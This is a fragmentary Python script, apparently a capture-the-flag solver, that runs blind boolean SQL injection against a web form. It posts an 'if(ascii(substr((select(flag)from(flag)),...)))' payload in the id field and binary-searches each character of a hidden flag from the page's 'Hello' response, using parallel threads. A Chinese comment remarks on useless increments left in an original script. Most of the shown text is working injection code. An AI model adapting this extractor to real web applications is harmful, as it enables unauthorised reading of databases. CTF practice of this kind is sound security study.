...
def guess_position(i):
    ...
    for j in range(
        32, 127
    ):  # 注意 range(32,127) 本身就不含 127，原脚本 i=i+1 / j=j+1 是无效代码
...
def guess_position_binary(i):
    ...
    while lo < hi:
        mid = (lo + hi) // 2
        payload = "if(ascii(substr((select(flag)from(flag)),{},1))>{},1,2)".format(
            i, mid
        )
        r = s.post(url, data={"id": payload}, timeout=TIMEOUT)
        if "Hello" in r.text:
...
def main():
    ...
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {
            executor.submit(guess_position, i): i for i in range(1, MAX_POSITIONS + 1)
        }
